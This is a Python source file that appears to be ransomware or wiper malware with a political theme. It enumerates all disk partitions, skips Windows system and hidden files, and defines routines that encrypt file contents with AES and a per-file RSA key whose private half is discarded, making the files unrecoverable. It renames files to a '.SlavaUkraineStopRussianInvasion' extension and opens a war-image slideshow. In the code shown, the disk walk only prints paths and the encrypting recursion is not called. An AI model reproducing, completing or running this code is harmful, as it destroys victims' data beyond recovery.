import psutil
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes


import base64
import zlib
import os
import stat
import tkinter as tk

from SlideShow import SlideShow


def generate_key():
    rsa = RSA.generate(2048)
    private_key = rsa.exportKey()
    public_key = rsa.publickey().exportKey()

    return private_key, public_key


def dirgo(directory):
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):
            encrypt_file(filepath)
        elif os.path.isdir(filepath):
            dirgo(filepath)


def encrypt(bytearr, public_key):
    compressed_bytearray = zlib.compress(bytearr)
    session_key = get_random_bytes(16)
    cipher = AES.new(session_key, AES.MODE_CBC)
    padded_bytearray = pad(compressed_bytearray)
    ciphertext = cipher.encrypt(padded_bytearray)
    imported_public_key = RSA.import_key(public_key)
    rsa_cipher = PKCS1_OAEP.new(imported_public_key)
    encrypted_session_key = rsa_cipher.encrypt(session_key)
    payload_msg = encrypted_session_key + ciphertext
    return base64.b64encode(payload_msg)


def pad(data):
    length = 16 - (len(data) % 16)
    return data + bytes([length]) * length


def encrypt_file(filename):
    with open(filename, 'rb') as f:
        plaintext = f.read()
    private_key, public_key = generate_key()
    payload_msg = encrypt(plaintext, public_key)
    with open(filename, "wb") as f:
        f.write(payload_msg)
    change_extension(filename)


def change_extension(filename):
    base_name, _ = os.path.splitext(filename)
    os.rename(filename, f"{base_name}.SlavaUkraineStopRussianInvasion")


def disksgo():
    for partition in psutil.disk_partitions(all=False):
        if os.path.exists(partition.device):
            encrypt_disk_files(partition.mountpoint)


def is_system_or_hidden_file(filepath):
    try:
        # Получаем атрибуты файла
        file_stat = os.stat(filepath)
        # Проверяем наличие атрибутов system и hidden
        return bool(file_stat.st_file_attributes & (stat.FILE_ATTRIBUTE_SYSTEM | stat.FILE_ATTRIBUTE_HIDDEN))
    except FileNotFoundError:
        return False


def encrypt_disk_files(disk):
    encryption_program_directory = os.path.dirname(os.path.abspath(__file__))
    # Получение всех каталогов и файлов на диске
    for root, dirs, files in os.walk(disk):
        # Проверка, что текущий каталог не является системным каталогом и не равен каталогу программы шифрования
        if not is_system_directory(root) and not is_encryption_program_directory(root, encryption_program_directory):
            # Перебор всех файлов в текущем каталоге
            for file in files:
                # Полный путь к файлу
                filepath = os.path.join(root, file)
                if not is_system_or_hidden_file(filepath):
                    print(filepath)


def is_system_directory(directory):
    # Получение системного каталога Windows
    system_root = os.environ['SystemRoot']
    # Проверка, содержит ли текущий каталог системный каталог Windows
    return directory.startswith(system_root)


def is_encryption_program_directory(directory, encryption_program_directory):
    # Проверка, является ли текущий каталог каталогом программы шифрования
    return directory == encryption_program_directory


if __name__ == "__main__":
    disksgo()
    form = tk.Tk()
    form.title("Слава Україні!То, что принес российский солдат в Украину!")
    image_files = ["imgwar2.jpg", "imgwar3.jpg", "imgwar4.jpg", "imgwar5.jpg", "imgwar6.jpg", "imgwar7.jpg"]
    delay = 2000  # Например, 2000 мс = 2 секунды
    app = SlideShow(form, image_files, delay)
    form.mainloop()


